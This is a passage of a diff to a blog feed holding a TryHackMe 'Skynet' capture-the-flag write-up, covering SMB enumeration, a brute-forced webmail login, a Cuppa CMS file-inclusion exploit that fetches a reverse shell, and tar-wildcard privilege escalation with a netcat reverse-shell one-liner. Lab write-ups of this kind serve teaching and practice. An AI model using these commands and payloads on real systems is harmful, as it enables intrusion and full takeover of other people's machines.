-|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
-|   Computer name: skynet
-|   NetBIOS computer name: SKYNET\x00
-|   Domain name: \x00
-|   FQDN: skynet
-|_  System time: 2021-01-24T10:37:29-06:00
-| smb-security-mode:
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode:
-|   2.02:
-|_    Message signing enabled but not required
-| smb2-time:
-|   date: 2021-01-24T16:37:29
-|_  start_date: N/A
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 13.79 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;6 Ports open:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
-  &lt;li&gt;80 - HTTP - Apache web server version 2.4.18&lt;/li&gt;
-  &lt;li&gt;110 - POP3 - Dovecot&lt;/li&gt;
-  &lt;li&gt;139/445 - Samba&lt;/li&gt;
-  &lt;li&gt;143 - IMAP - Dovecot&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
-
-&lt;p&gt;A few ports to review but I started with SMB because typically in CTF’s you can find anonymous access to share which provide hints or files required on other ports. Using smbmap I found one accessible share called anonymous.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $smbmap -H 10.10.120.207
-[+] Guest session       IP: 10.10.120.207:445   Name: 10.10.120.207                                     
-        Disk                                                    Permissions     Comment
-        ----                                                    -----------     -------
-        print$                                                  NO ACCESS       Printer Drivers
-        anonymous                                               READ ONLY       Skynet Anonymous Share
-        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
-        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Using smbclient I was able to connect to the share and found a text file and a folder of logs files. I downloaded all the files to my machine.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $smbclient //10.10.120.207/anonymous
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&amp;gt; ls
-  .                                   D        0  Thu Nov 26 16:04:00 2020
-  ..                                  D        0  Tue Sep 17 08:20:17 2019
-  attention.txt                       N      163  Wed Sep 18 04:04:59 2019
-  logs                                D        0  Wed Sep 18 05:42:16 2019
-
-                9204224 blocks of size 1024. 5822640 blocks available
-smb: \&amp;gt; get attention.txt 
-getting file \attention.txt of size 163 as attention.txt (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
-smb: \&amp;gt; cd logs
-smb: \logs\&amp;gt; ls
-  .                                   D        0  Wed Sep 18 05:42:16 2019
-  ..                                  D        0  Thu Nov 26 16:04:00 2020
-  log2.txt                            N        0  Wed Sep 18 05:42:13 2019
-  log1.txt                            N      471  Wed Sep 18 05:41:59 2019
-  log3.txt                            N        0  Wed Sep 18 05:42:16 2019
-
-                9204224 blocks of size 1024. 5819896 blocks available
-smb: \logs\&amp;gt; mget *
-Get file log2.txt? y
-getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.7 KiloBytes/sec)
-Get file log1.txt? y
-getting file \logs\log1.txt of size 471 as log1.txt (4.1 KiloBytes/sec) (average 1.8 KiloBytes/sec)
-Get file log3.txt? y
-getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 1.4 KiloBytes/sec)
-smb: \logs\&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The attention.txt file is a note:&lt;/p&gt;
-
-&lt;p&gt;“A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
--Miles Dyson”&lt;/p&gt;
-
-&lt;p&gt;However log1.txt looks to be a password list. log2 and log3 are empty. I moved on to start enumerating the website.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/skynet/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nothing to note on the page or in the page source so I ran a gobuster.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Skynet]
-└──╼ $gobuster dir -u http://10.10.120.207 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.120.207
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2021/01/24 16:38:47 Starting gobuster
-===============================================================
-/admin (Status: 301)
-/css (Status: 301)
-/js (Status: 301)
-/config (Status: 301)
-/ai (Status: 301)
-/squirrelmail (Status: 301)
-/server-status (Status: 403)
-===============================================================
-2021/01/24 16:41:06 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;/squirrelmail brings to me to a login page.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/skynet/squirrelmail.png&quot; alt=&quot;squirrelmail&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Using Burp intruder I was able to find the login details for Miles. I created a username file with the following entries:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;miles&lt;/li&gt;
-  &lt;li&gt;mdyson&lt;/li&gt;
-  &lt;li&gt;milesdyson&lt;/li&gt;
-  &lt;li&gt;milesd&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Using this list of usernames and the passwords found in log1.txt I was able to access the email account.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/skynet/emails.png&quot; alt=&quot;emails&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;One of the emails is miles new SMB password.&lt;/p&gt;
-
-&lt;p&gt;“We have changed your smb password after system malfunction.
-Password: )s{A&amp;amp;2Z{REDACTED}”&lt;/p&gt;
-
-&lt;p&gt;Going back to smbclient I tried to connect to the SMB share milesdyson with the new password and got in.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $smbclient //10.10.120.207/milesdyson -U milesdyson -p                                         
-Enter WORKGROUP\milesdyson's password:                                                              
-Try &quot;help&quot; to get a list of possible commands.                                                      
-smb: \&amp;gt; ls                                                                                          
-  .                                   D        0  Tue Sep 17 10:05:47 2019                          
-  ..                                  D        0  Wed Sep 18 04:51:03 2019                          
-  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 10:05:14 2019                      
-  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 10:05:14 2019
-  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 10:05:14 2019                   
-  notes                               D        0  Tue Sep 17 10:18:40 2019                          
-  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 10:05:14 2019                   
-  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 10:05:14 2019           
-                                                                                                    
-                9204224 blocks of size 1024. 5810144 blocks available                               
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Only really one file of interest /notes/important.txt&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat important.txt 
-
-1. Add features to beta CMS /45kra2{REDACTED}
-2. Work on T-800 Model 101 blueprints
-3. Spend more time with my wife
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;A new cms directory to probe, looking at the page it appears to be a blog page for Miles.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/skynet/miles.png&quot; alt=&quot;miles&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Running gobuster again against the directory reveals a administrator page.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.120.207/45kra2{REDACTED}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.120.207/45kra2{REDACTED}/
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2021/01/24 16:48:27 Starting gobuster
-===============================================================
-/administrator (Status: 301)
-===============================================================
-2021/01/24 16:50:42 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
-
-&lt;p&gt;Going to http://10.10.120.207/45kra2{REDACTED}/administrator/ takes us to a login page for Cuppa CMS. A quick Google reveals the &lt;a href=&quot;https://www.exploit-db.com/exploits/25971&quot;&gt;exploit&lt;/a&gt; which provides and local and remote file inclusion.&lt;/p&gt;
-
-&lt;p&gt;Looking at the exploit we can simply request a URL with our shell code location. We can use this to get a reverse shell payload from our machine and then execute.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;On my machine I copied /usr/share/webshells/php/php-reverse-shell.php to my working directory and renamed it to shell.php, I updated the configuration to include my VPN IP and port 4444.&lt;/p&gt;
-
-&lt;p&gt;Then using python3 I started a http server to host the reverse shell payload and started a netcat listener on port 4444. In my browser I entered:&lt;/p&gt;
-
-&lt;p&gt;http://10.10.120.207/45kra2{REDACTED}/administrator/alerts/alertConfigField.php?urlConfig=http:///shell.php&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo python3 -m http.server 80                                      
-                                                                          
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...                  
-10.10.120.207 - - [24/Jan/2021 16:57:15] &quot;GET /shell.php HTTP/1.0&quot; 200 -  
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;On my netcat listener I get a response and got a shell as ‘www-data’.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
-listening on [any] 4444 ...
-connect to [] from (UNKNOWN) [10.10.120.207] 59292
-Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
- 10:57:15 up 22 min,  0 users,  load average: 0.00, 0.04, 0.06
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-$   
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
-
-&lt;p&gt;Looking at the file system there are two files backup.sh and backup.tgz both owned by root.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;drwxr-xr-x 2 root       root       4.0K Sep 17  2019 .
-drwxr-xr-x 5 milesdyson milesdyson 4.0K Sep 17  2019 ..
--rwxr-xr-x 1 root       root         74 Sep 17  2019 backup.sh
--rw-r--r-- 1 root       root       4.5M Jan 24 10:59 backup.tgz
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The script is really simple, just creating a backup tar file or /var/www/html.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ cat backup.sh
-#!/bin/bash
-cd /var/www/html
-tar cf /home/milesdyson/backups/backup.tgz *
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;However because the tar command is using * which is a wild card and it appears the script is being run by root as a cron job we can exploit this to get a reverse shell. This &lt;a href=&quot;https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/&quot;&gt;article&lt;/a&gt; explains it in detail.&lt;/p&gt;
-
-&lt;p&gt;I following the same steps in the article and set my port to 5555 as already have a shell on port 4444.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc  5555 &amp;gt;/tmp/f&quot; &amp;gt; shell.sh
-echo &quot;&quot; &amp;gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;
-echo &quot;&quot; &amp;gt; &quot;--checkpoint=1&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now just wait for a minute and we now have a root shell!&lt;/p&gt;
-
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry></feed>
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="medium" /><summary type="html"></summary></entry></feed>
